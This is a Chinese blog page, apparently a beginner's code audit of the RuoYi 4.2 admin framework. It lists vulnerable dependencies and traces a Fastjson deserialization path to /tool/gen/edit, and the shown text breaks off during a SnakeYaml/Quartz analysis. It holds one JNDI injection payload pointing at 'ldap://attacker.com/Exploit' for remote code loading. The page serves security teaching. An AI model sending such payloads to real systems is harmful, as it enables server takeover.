@@ -1,0 +1,354 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>RuoYi-4.2代码审计 | Iz0fPriestess</title><meta name="author" content="Creexile"><meta name="copyright" content="Creexile"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="有什么单词以n开头g结尾, nothing">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RuoYi-4.2代码审计">
+<meta property="og:url" content="https://4reexile.github.io/article/ruoyi4.2/index.html">
+<meta property="og:site_name" content="Iz0fPriestess">
+<meta property="og:description" content="有什么单词以n开头g结尾, nothing">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://4reexile.github.io/img/tx.png">
+<meta property="article:published_time" content="2025-08-21T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-11-21T08:31:46.366Z">
+<meta property="article:author" content="Creexile">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://4reexile.github.io/img/tx.png"><link rel="shortcut icon" href="/img/prts.ico"><link rel="canonical" href="https://4reexile.github.io/article/ruoyi4.2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?76992a4541699d4a08e36c0eb02f7796";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'RuoYi-4.2代码审计',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-11-21 16:31:46'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/tx.png" onerror="onerror=null;src='/img/sddd.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">103</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">107</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">13</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bjt.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Iz0fPriestess"><span class="site-name">Iz0fPriestess</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">RuoYi-4.2代码审计</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-08-21T16:00:00.000Z" title="Created 2025-08-22 00:00:00">2025-08-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-11-21T08:31:46.366Z" title="Updated 2025-11-21 16:31:46">2025-11-21</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">3.7k</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>代码审计入门promax</p>
+<p>参考文章</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_79545986/article/details/150265995">csdn-ruoyi若依4.6.0SQL注入代码审计（小白向 部署+源码审计）</a></li>
+<li><a target="_blank" rel="noopener" href="https://doc.ruoyi.vip/ruoyi/document/hjbs.html#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C">ruoyi-环境部署</a></li>
+<li><a href="RuoYi%204.2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A1%88%E4%BE%8B.pdf">pdf-RuoYi 4.2代码审计案例</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11374">先知社区-【代码审计】若依后台管理系统</a></li>
+<li><a target="_blank" rel="noopener" href="https://b1ue.cn/archives/239.html">Java 反序列化漏洞始末（5）— XML/YAML</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15463">先知社区-若依cms代码审计+不同版本漏洞复现</a></li>
+<li><a target="_blank" rel="noopener" href="https://forum.butian.net/share/4328">奇安信攻防社区-若依(RuoYi)框架漏洞战争手册</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_9652359/13077192">代码审计学习-若依框架</a></li>
+<li>还有doc文件夹中的若依环境使用手册</li>
+</ol>
+<h1>环境搭建</h1>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ruoyi：4.2 </span><br><span class="line">MYSQL: 8.0.32 MySQL Community Server </span><br><span class="line">JDK: jdk-8u161-windows--64 （⼀定不要使⽤⾼版本jdk不然利⽤链⽆法利⽤） MAVEN: apache-maven-3.2.3-bin</span><br></pre></td></tr></table></figure>
+<p>jdk要手动配置是真的</p>
+<p><strong>安装依赖</strong>
+右键pom.xml选择maven选择生成源代码并更新文件夹,更新完成后选择同步项目</p>
+<p><strong>配置数据库</strong>
+开启你的mysql数据库并创建名为ry的数据库, 在该库中执行sql文件夹内的<code>quartz.sql</code>和<code>ry_20200323.sql</code></p>
+<p>修改<code>ruoyi-admin/src/main/resources/application-druid.yml</code>第10行和第11行数据库账密, 或者你直接在数据库中新增也行</p>
+<p><strong>启动服务器</strong>
+启动<code>ruoyi-admin/src/main/java/com/ruoyi/RuoYiApplication.java</code>, 出现该文件内的内容即可确认正常启动</p>
+<p>现在开始你的代码审计</p>
+<h1>前置知识</h1>
+<p><a href="../../../%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%89%8D%E7%BD%AE.md">代码审计前置</a></p>
+<h1>代码审计</h1>
+<h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2>
+<p>我说信息收集是安全的底层逻辑</p>
+<p>存在pom.xml可以对内容进行审计, 如果用的是IDEA, 有一个易受攻击的依赖项, 你可以看哪些有漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java 1.8</span><br><span class="line">shiro 1.4.2 - 存在</span><br><span class="line">thymeleaf 2.0.0 - 存在</span><br><span class="line">mybatis 1.3.2</span><br><span class="line">druid 1.1.14</span><br><span class="line">bitwalker 1.19</span><br><span class="line">kaptcha 2.3.2</span><br><span class="line">swagger 2.9.2</span><br><span class="line">pagehelper 1.2.5</span><br><span class="line">fastjson 1.2.60 - 存在</span><br><span class="line">oshi 3.9.1</span><br><span class="line">commons.io 2.5 - 存在</span><br><span class="line">commons.fileupload 1.3.3</span><br><span class="line">poi 3.17 - 存在</span><br><span class="line">velocity 1.7 - 存在</span><br><span class="line">snakeyaml - 存在</span><br><span class="line"></span><br><span class="line">SpringBoot 2.1.1.RELEASE</span><br></pre></td></tr></table></figure>
+<p>也可以从README中获取信息, 搭好网站登陆进去就能看到了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">核心框架：Spring Boot。</span><br><span class="line">安全框架：Apache Shiro。</span><br><span class="line">模板引擎：Thymeleaf。</span><br><span class="line">持久层框架：MyBatis。</span><br><span class="line">定时任务: Quartz。</span><br><span class="line">数据库连接池：Druid。</span><br><span class="line">工具类：Fastjson。</span><br><span class="line">更多:...</span><br></pre></td></tr></table></figure>
+<h2 id="通读全文"><a class="header-anchor" href="#通读全文">¶</a>通读全文</h2>
+<p>不要问通读全文, 我没那个能力</p>
+<p><code>ruoyi-admin\src\main\java\com\ruoyi\web\controller\</code>
+控制层</p>
+<p><code>ruoyi-system\src\main\java\com\ruoyi\system\</code>
+领域模型层</p>
+<h2 id="手工"><a class="header-anchor" href="#手工">¶</a>手工</h2>
+<p>真干起来肯定是用工具直接干, 然后看工具有无误报; 练习就从头开始</p>
+<p>不借助工具那就是: 组件漏洞-&gt;关键词审计-&gt;从路由整过去</p>
+<p>比较快的方式是利用从<code>pom.xml</code>中获取的信息, 先对组件进行审计</p>
+<p>那就从最简单的shiro开始吧</p>
+<h3 id="组件漏洞"><a class="header-anchor" href="#组件漏洞">¶</a>组件漏洞</h3>
+<h4 id="shiro"><a class="header-anchor" href="#shiro">¶</a>shiro</h4>
+<p>关键词<code>setCipherKey</code>或<code>CookieRememberMeManager</code></p>
+<p><code>RuoYi-v4.2\ruoyi-framework\src\main\java\com\ruoyi\framework\config\ShiroConfig.java</code>
+该文件中第331行出现了硬编码密钥</p>
+<blockquote>
+<p>如果有环境, 那可以用工具打来试试; 如果没有, 那就只能单纯审计代码</p>
+</blockquote>
+<p>不过组件漏洞一般会有那种漏洞复现里面带着代码分析, 比如说这个:<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/252539.html">freebuf-Shiro组件漏洞与攻击链分析</a></p>
+<h4 id="Thymeleaf"><a class="header-anchor" href="#Thymeleaf">¶</a>Thymeleaf</h4>
+<p>不知道就去找找呗, 比如说这个<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_71692682/article/details/130538310">csdn-Thymeleaf模板注入漏洞总结及修复方法（上篇）</a></p>
+<p>由于使用了这个模板引擎, 所以部分前置知识需要知晓<a href="../../java/%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5.md">Thymeleaf模板注入</a>, 寻找漏洞便容易许多</p>
+<p>结合上面的知识, 没有找到利用点, 若依v4.7.1据说存在, 以后看看</p>
+<h4 id="fastjson"><a class="header-anchor" href="#fastjson">¶</a>fastjson</h4>
+<p>Fastjson &lt;= 1.2.68 RCE</p>
+<p>找<code>parseObject</code>关键词, 文中仅有<code>JSONObject.parseObject</code>方法</p>
+<p>当你调用 <code>JSONObject.parseObject(result)</code> 时，实际上是调用了 <code>JSON</code> 类中的 <code>parseObject(String text)</code> 方法, 同样可以触发反序列化</p>
+<blockquote>
+<p><code>JSONObject</code> 是 <code>JSON</code> 类的子类或它的一部分，所以它会直接继承或使用父类的方法</p>
+</blockquote>
+<p>此处存在的两个java路径:</p>
+<ul>
+<li><code>RuoYi-v4.2\ruoyi-generator\src\main\java\com\ruoyi\generator\util\VelocityUtils.java</code></li>
+<li><code>RuoYi-v4.2\ruoyi-generator\src\main\java\com\ruoyi\generator\service\impl\GenTableServiceImpl.java</code></li>
+</ul>
+<p><code>VelocityUtils.java</code>中, 代码和思路如下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setTreeVelocityContext</span><span class="params">(VelocityContext context, GenTable genTable)</span>  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">options</span> <span class="operator">=</span> genTable.getOptions();  </span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">paramsObj</span> <span class="operator">=</span> JSONObject.parseObject(options);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol>
+<li>存在参数options -&gt; 追溯参数
+<ul>
+<li>ctrl单击获取到函数 <code>genTable.getOptions()</code> 追溯该函数 <code>return options;</code></li>
+</ul>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 其它生成选项 */</span>  </span><br><span class="line"><span class="keyword">private</span> String options;</span><br></pre></td></tr></table></figure>
+<p>看来没有收获, 仅知道了是用于 其它生成选项 的字段, 那我们转头去寻找功能点的调用</p>
+<ol start="2">
+<li>位于函数<code>setTreeVelocityContext()</code> -&gt; 追溯函数
+<ul>
+<li>右键查找用法获取到函数<code>prepareContext()</code></li>
+</ul>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 设置模板变量信息</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 模板列表</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> VelocityContext <span class="title function_">prepareContext</span><span class="params">(GenTable genTable)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> (GenConstants.TPL_TREE.equals(tplCategory))</span><br><span class="line">    &#123;</span><br><span class="line">        setTreeVelocityContext(velocityContext, genTable);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> velocityContext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>跟进常量<code>TPL_TREE</code>和参数<code>tplCategory</code>, 得知值<code>TPL_TREE</code>为tree, <code>tplCategory</code>注释为 使用的模板（crud单表操作 tree树表操作）, 结合代码, 当tplCategory值为tree的时候才会触发该方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tplCategory = &#x27;tree&#x27;; -&gt; 调用setTreeVelocityContext()</span><br></pre></td></tr></table></figure>
+<p>回到<code>prepareContext()</code>, <code>GenTaleServiceImpl.java</code>中第187行和250行都有所调用, 先看187行</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Map&lt;String, String&gt; <span class="title function_">previewCode</span><span class="params">(Long tableId)</span></span><br><span class="line">&#123;</span><br><span class="line">    Map&lt;String, String&gt; dataMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// 查询表信息</span></span><br><span class="line">    <span class="type">GenTable</span> <span class="variable">table</span> <span class="operator">=</span> genTableMapper.selectGenTableById(tableId);</span><br><span class="line">    <span class="comment">// 查询列信息</span></span><br><span class="line">    List&lt;GenTableColumn&gt; columns = table.getColumns();</span><br><span class="line">    setPkColumn(table, columns);</span><br><span class="line">    VelocityInitializer.initVelocity();</span><br><span class="line"></span><br><span class="line">    <span class="type">VelocityContext</span> <span class="variable">context</span> <span class="operator">=</span> VelocityUtils.prepareContext(table);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>table由<code>genTableMapper.selectGenTableById(tableId)</code>控制, 我们只能操控 tableId 参数</p>
+<p>因为该参数在函数的形参中, 我们可以直接追溯函数<code>previewCode()</code></p>
+<blockquote>
+<p>如果对前面的函数感兴趣可以放鼠标上去, 应该会弹出注释</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 预览代码</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequiresPermissions(&quot;tool:gen:preview&quot;)</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/preview/&#123;tableId&#125;&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> AjaxResult <span class="title function_">preview</span><span class="params">(<span class="meta">@PathVariable(&quot;tableId&quot;)</span> Long tableId)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">&#123;</span><br><span class="line">    Map&lt;String, String&gt; dataMap = genTableService.previewCode(tableId);</span><br><span class="line">    <span class="keyword">return</span> AjaxResult.success(dataMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>输入是简单类型（Long）且来自 URL 路径</li>
+<li>攻击者无法注入恶意 JSON 负载</li>
+</ul>
+<p>这条路算是走不通了; 我说代码审计就是这样的, 走了半天发现前面是一条死路, 王朝了</p>
+<p>没事, 这里一共就两个触发点, 不是那种一大坨的</p>
+<p>来看看<code>GenTableServiceImpl.java</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 修改保存参数校验</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> genTable 业务信息</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">validateEdit</span><span class="params">(GenTable genTable)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (GenConstants.TPL_TREE.equals(genTable.getTplCategory()))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">options</span> <span class="operator">=</span> JSON.toJSONString(genTable.getParams());</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">paramsObj</span> <span class="operator">=</span> JSONObject.parseObject(options);</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>options -&gt; <code>JSON.toJSONString(genTable.getParams());</code> -&gt; genTable</p>
+<p>说明是这个函数的形参, 直接追踪函数调用</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 修改保存代码生成业务</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequiresPermissions(&quot;tool:gen:edit&quot;)</span></span><br><span class="line"><span class="meta">@Log(title = &quot;代码生成&quot;, businessType = BusinessType.UPDATE)</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/edit&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> AjaxResult <span class="title function_">editSave</span><span class="params">(<span class="meta">@Validated</span> GenTable genTable)</span></span><br><span class="line">&#123;</span><br><span class="line">    genTableService.validateEdit(genTable);</span><br><span class="line">    genTableService.updateGenTable(genTable);</span><br><span class="line">    <span class="keyword">return</span> AjaxResult.success();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用 <code>@PostMapping</code>，接收POST请求</li>
+<li>参数 <code>GenTable genTable</code> 通过 <code>@Validated</code> 注解，Spring会自动将请求体中的JSON数据反序列化为GenTable对象</li>
+<li><code>validateEdit()</code>首先将参数转换为JSON字符串, 随后进行Fastjson反序列化</li>
+</ul>
+<p>看回参考文章发现这里漏了<code>validateEdit()</code>函数的<code>genTable.getParams()</code>的分析,跟进发现直接返回一个<code>new HashMap&lt;&gt;()</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">getParams</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (params == <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        params = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在跟进params, 发现定义为<code>Map&lt;String, Object&gt;</code>, 可以理解为params字段中可以传任何类型的值在里面, 所以传入可以是恶意的字符串而不像第一条链一样只能是Long</p>
+<p>尝试验证一下吧</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /tool/gen/edit HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;tplCategory&quot;: &quot;tree&quot;,</span><br><span class="line">  &quot;params&quot;: &#123;</span><br><span class="line">    &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">    &quot;dataSourceName&quot;: &quot;ldap://attacker.com/Exploit&quot;,</span><br><span class="line">    &quot;autoCommit&quot;: true</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="SnakeYaml"><a class="header-anchor" href="#SnakeYaml">¶</a>SnakeYaml</h4>
+<p>我直接找到了SnakeYaml和定时任务功能存在RCE, 正好之前是从关键函数倒头寻找实现再到路由, 现在从路由一路往下找关键函数</p>
+<p>定时任务在ruoyi-quartz下, 先了解一下如何正向分析</p>
+<p>流程: 控制层-&gt;服务层</p>
+<p>首先关注控制层(controller), 它与前台交互并传输参数到服务(Service)层</p>
+<p>ruoyi-quartz仅有两个控制的类, 根据注释描述, <code>SysJobLogController</code>是调度日志操作处理的类, 所以我们不需要再管, 去看<code>SysJobLogController</code>这个调度任务信息操作处理的类</p>
+<p>结合功能, RCE需要被执行, 寻找到注释为&quot;任务调度立即执行一次&quot;的<code>run()</code>函数</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 任务调度立即执行一次</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Log(title = &quot;定时任务&quot;, businessType = BusinessType.UPDATE)</span></span><br><span class="line"><span class="meta">@RequiresPermissions(&quot;monitor:job:changeStatus&quot;)</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/run&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> AjaxResult <span class="title function_">run</span><span class="params">(SysJob job)</span> <span class="keyword">throws</span> SchedulerException</span><br><span class="line">&#123;</span><br><span class="line">    jobService.run(job);</span><br><span class="line">    <span class="keyword">return</span> success();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>追踪函数里面的<code>jobService.run()</code>, 发现有一个实现</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * 立即运行任务  </span></span><br><span class="line"><span class="comment"> *   </span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> job 调度信息  </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"><span class="meta">@Override</span>  </span><br><span class="line"><span class="meta">@Transactional</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">(SysJob job)</span> <span class="keyword">throws</span> SchedulerException  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="type">Long</span> <span class="variable">jobId</span> <span class="operator">=</span> job.getJobId();  </span><br><span class="line">    <span class="type">SysJob</span> <span class="variable">tmpObj</span> <span class="operator">=</span> selectJobById(job.getJobId());  </span><br><span class="line">    <span class="comment">// 参数  </span></span><br><span class="line">    <span class="type">JobDataMap</span> <span class="variable">dataMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JobDataMap</span>();  </span><br><span class="line">    dataMap.put(ScheduleConstants.TASK_PROPERTIES, tmpObj);  </span><br><span class="line">    scheduler.triggerJob(ScheduleUtils.getJobKey(jobId, tmpObj.getJobGroup()), dataMap);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先通过调度任务ID查询调度信息, 可以跟进SysJob看看定时任务调度表的定义</p>
+<p>然后实例化<code>JobDataMap</code>, 继承自<code>org.quartz.utils.StringKeyDirtyFlagMap</code>, 查看发现大概就是将信息(键值对)保存在里面</p>
+<p>所以这个函数只是告诉Quartz调度器立即执行该任务; Quartz框架罪大恶极, 所以真正的执行不在这里</p>
+<p>现在寻找Quartz执行器, 可以用关键词搜索:</p>
